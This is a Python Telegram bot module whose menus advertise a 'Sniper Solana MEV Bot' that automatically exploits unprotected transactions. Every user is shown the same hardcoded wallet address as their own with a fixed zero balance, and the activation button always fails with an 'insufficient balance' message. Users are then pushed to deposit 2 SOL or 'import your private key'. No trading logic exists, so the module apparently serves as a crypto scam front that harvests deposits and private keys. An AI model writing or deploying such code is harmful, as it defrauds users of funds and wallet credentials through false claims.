from telebot import types

def handle_start_mev(bot, call):
    chat_id = call.message.chat.id
    pubkey = "cbKTm2vT8xqcHZbGDjFo39T1tZjQag4ke7CGLEWd6jm"

    text = f"""
🚀 *Launch MEV Sniper*
Designed to automatically execute MEV attacks by filtering unprotected transactions on top coins and instantly exploiting them.

🔑 *Your Main SOL Wallet*
`{pubkey}` _(Tap to copy)_

💰 *Balance:* `0.0 SOL` ($0.0)

🤖 *Auto Buy:* One-click simplicity – our AI handles trades, MEV protection, and timing.

⚠️ *NOTE:* A 2% fee applies to profits.

💡 _Please keep at least 2 SOL into your wallet or import your private key to activate Sniper Solana MEV Bot_
"""

    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("🤖 Auto Buy", callback_data="start_mev_auto_buy")
    )
    keyboard.add(
        types.InlineKeyboardButton("❌ Close", callback_data="start_mev_close"),
        types.InlineKeyboardButton("🔄 Refresh", callback_data="StartEVSniper")
    )

    bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=keyboard)


def handle_start_mev_callback(bot, call):
    if call.data == "start_mev_close":
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass

    elif call.data == "start_mev_auto_buy":
        text = """❌ *Sniper Solana MEV Bot not active* because your current balance is insufficient!

    🔑 *Your Main SOL Wallet*
    `cbKTm2vT8xqcHZbGDjFo39T1tZjQag4ke7CGLEWd6jm` _(Tap to copy)_

    💰 *Balance:* `0.0 SOL` ($0.0)

    💡 _Please keep at least 2 SOL into your wallet or import your private key to activate Sniper Solana MEV Bot._
    """

        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton("📦 Wallet", callback_data="wallet"),
            types.InlineKeyboardButton("🔑 Connect Wallet", callback_data="import_wallet")
        )
        keyboard.add(
            types.InlineKeyboardButton("❌ Close", callback_data="start_mev_close")
        )

        bot.send_message(call.message.chat.id, text, parse_mode="Markdown", reply_markup=keyboard)


    elif call.data == "StartEVSniper":
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except:
            pass
        handle_start_mev(bot, call)  # Resend the MEV menu

